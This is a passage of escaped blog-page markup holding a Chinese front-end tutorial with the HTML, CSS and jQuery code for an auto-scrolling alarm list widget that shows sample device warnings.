class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> wrnList = [</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">1</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"3\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"pressure过高\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:34:05\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区1\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">2</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"4\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"tds过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:44\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区2\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">3</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"4\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"tds过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:44\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区3\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">4</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"4\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"tds过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:44\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区4\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">5</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"3\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"pressure过高\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:05\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区5\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">6</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"3\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"pressure过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 12:34:05\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区6\"</span>&#125;];</span><br><span class=\"line\"><span class=\"keyword\">var</span> timer = <span class=\"number\">0</span>;</span><br><span class=\"line\">mouseLeave();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 翻滚</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">autoScroll</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> dom = $(<span class=\"string\">\"#wrnList\"</span>);</span><br><span class=\"line\">\tdom.css(<span class=\"string\">'margin-top'</span>, <span class=\"string\">'-56px'</span>);</span><br><span class=\"line\">\tdom.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第三行变第二行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child3 = $(<span class=\"string\">\".child_3\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// child3.removeClass('child_3');</span></span><br><span class=\"line\">\t<span class=\"comment\">// child3.addClass('child_2');</span></span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'padding'</span>, <span class=\"string\">'0 40px'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'0.6'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'height'</span>, <span class=\"string\">'46px'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'width'</span>, <span class=\"string\">'calc(302px - 80px)'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'background-image'</span>, <span class=\"string\">\"url('./img/wrn/small.png')\"</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'background-size'</span>, <span class=\"string\">'302px auto'</span>);</span><br><span class=\"line\">\tchild3.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第四行变第三行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child4 = $(<span class=\"string\">\".child_4\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// child4.removeClass('child_4');</span></span><br><span class=\"line\">\t<span class=\"comment\">// child4.addClass('child_3');</span></span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'padding'</span>, <span class=\"string\">'0 50px'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'1'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'height'</span>, <span class=\"string\">'58px'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'width'</span>, <span class=\"string\">'calc(416px - 100px)'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'background-image'</span>, <span class=\"string\">\"url('./img/wrn/big.png')\"</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'background-size'</span>, <span class=\"string\">'416px auto'</span>);</span><br><span class=\"line\">\tchild4.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第五行变第四行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child5 = $(<span class=\"string\">\".child_5\"</span>);</span><br><span class=\"line\">\tchild5.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'0.6'</span>);</span><br><span class=\"line\">\tchild5.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第二行变第一行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child2 = $(<span class=\"string\">\".child_2\"</span>);</span><br><span class=\"line\">\tchild2.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'0.3'</span>);</span><br><span class=\"line\">\tchild2.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> that = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\tthat.wrnList.push(that.wrnList[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\tthat.wrnList.shift();</span><br><span class=\"line\">\t\tthat.insertWrn();</span><br><span class=\"line\">\t\tdom.css(<span class=\"string\">'margin-top'</span>, <span class=\"string\">'0px'</span>);</span><br><span class=\"line\">\t\tdom.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild3.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild4.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild5.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild2.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t&#125;, <span class=\"number\">400</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 插数据方法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insertWrn</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> hl = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> wrnType = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> wrnList) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i &gt; <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">4</span> || wrnList[i].deviceType == <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'用水报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">2</span> || wrnList[i].deviceType == <span class=\"number\">3</span> || wrnList[i].deviceType == <span class=\"number\">7</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'管网报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'用电报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'空气报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'未知报警'</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\thl += <span class=\"string\">`&lt;div class=\"wrnItem child_<span class=\"subst\">$&#123;<span class=\"built_in\">parseInt</span>(i) + <span class=\"number\">1</span>&#125;</span>\"&gt;&lt;div class=\"wrnItemTime\"&gt;<span class=\"subst\">$&#123;wrnList[i].areaName&#125;</span> <span class=\"subst\">$&#123;wrnList[i].content&#125;</span> <span class=\"subst\">$&#123;wrnType&#125;</span> <span class=\"subst\">$&#123;wrnList[i].createTime&#125;</span>&lt;/div&gt;&lt;/div&gt;`</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$(<span class=\"string\">\"#wrnList\"</span>).html(hl);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 告警列表点击事件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">clickList</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> itemId = wrnList[<span class=\"number\">2</span>].id;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> e = event || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> winWidth = <span class=\"built_in\">window</span>.innerWidth;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"winWidth\", winWidth);</span></span><br><span class=\"line\">\t<span class=\"keyword\">let</span> x = e.clientX;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> y = e.clientY;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"x\", x);</span></span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"y\", y);</span></span><br><span class=\"line\">\t<span class=\"keyword\">let</span> right_margin = winWidth - x;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> top_margin = y;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"right_margin\",right_margin);</span></span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"top_margin\",top_margin);</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (top_margin &lt;= <span class=\"number\">285</span> &amp;&amp; top_margin &gt;= <span class=\"number\">256</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (right_margin &gt;= <span class=\"number\">153</span> &amp;&amp; right_margin &lt;= <span class=\"number\">223</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// console.log(\"发起工单\");</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// addWorkOrder(itemId);</span></span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"发起工单\"</span> + itemId);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (right_margin &gt; <span class=\"number\">223</span> &amp;&amp; right_margin &lt;= <span class=\"number\">394</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// console.log(\"忽略\");</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// ignoreWarning(itemId);</span></span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"误报\"</span> + itemId);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"i\", i);</span></span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"itemId\", itemId);</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 鼠标移入</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mouseEnter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"mouseEnter\");</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (timer != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tclearInterval(timer);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child = $(<span class=\"string\">\".child_3\"</span>);</span><br><span class=\"line\">\tchild.css(<span class=\"string\">'padding-bottom'</span>, <span class=\"string\">'34px'</span>);</span><br><span class=\"line\">\tchild.css(<span class=\"string\">'background-image'</span>, <span class=\"string\">\"url('./img/wrn/big_on.png')\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 鼠标离开</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mouseLeave</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\tinsertWrn();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (wrnList.length &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">\t\ttimer = setInterval(autoScroll, <span class=\"number\">1800</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>原理自己探索吧，项目需求有些特别，所以有的地方比较定制化，自己用的话可能要做不少修改。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<ul>\n<li><a href=\"https://blog.ctftools.com/static_web/wrnList/index.html\">点击这里看效果</a>，鼠标悬浮到告警列表会停止。</li>\n</ul>","more":"<ul>\n<li><p>点击下载<a href=\"https://blog.ctftools.com/static_web/wrnList/wrnList.zip\">wrnList.zip</a> 。</p>\n</li>\n<li><p><code>index.html</code></p>\n</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span> /&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>告警<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"./css/warning.css\"</span> /&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"wrnList\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">\"mouseEnter()\"</span> <span class=\"attr\">onmouseout</span>=<span class=\"string\">\"mouseLeave()\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"clickList()\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"wrnList\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>warning.css</code></li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">html</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">rgba</span>(13, 20, 46, 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.wrnList</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">416px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">290px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">\t<span class=\"attribute\">z-index</span>: <span class=\"number\">999</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">top</span>: <span class=\"number\">82px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">right</span>: <span class=\"number\">14px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#wrnList</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">pointer-events</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.wrnItem</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">9px</span> auto;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">46px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">302px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-repeat</span>: no-repeat;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">\t<span class=\"attribute\">align-items</span>: center;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#FFFFFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child_1</span>,<span class=\"selector-class\">.child_5</span>,<span class=\"selector-class\">.child_6</span>  &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">40px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"built_in\">calc</span>(302px - 80px);</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">46px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">opacity</span>: <span class=\"number\">0.3</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/small.png'</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">background-size</span>: <span class=\"number\">302px</span> auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child_2</span>,<span class=\"selector-class\">.child_4</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">40px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"built_in\">calc</span>(302px - 80px);</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">46px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">opacity</span>: <span class=\"number\">0.6</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/small.png'</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">background-size</span>: <span class=\"number\">302px</span> auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.child_3</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">50px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"built_in\">calc</span>(416px - 100px);</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">58px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-size</span>: <span class=\"number\">100%</span> auto;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/big.png'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.anim</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">transition</span>: all <span class=\"number\">0.4s</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.wrnItemTime</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">white-space</span>: nowrap;</span><br><span class=\"line\">\t<span class=\"attribute\">padding-left</span>: <span class=\"number\">24px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-image</span>: <span class=\"built_in\">url</span>(<span class=\"string\">'./../img/wrn/wrning.png'</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">background-repeat</span>: no-repeat;</span><br><span class=\"line\">\t<span class=\"attribute\">background-position</span>: -<span class=\"number\">6px</span> -<span class=\"number\">5px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">\t<span class=\"attribute\">text-overflow</span>: ellipsis;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>index.js</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span 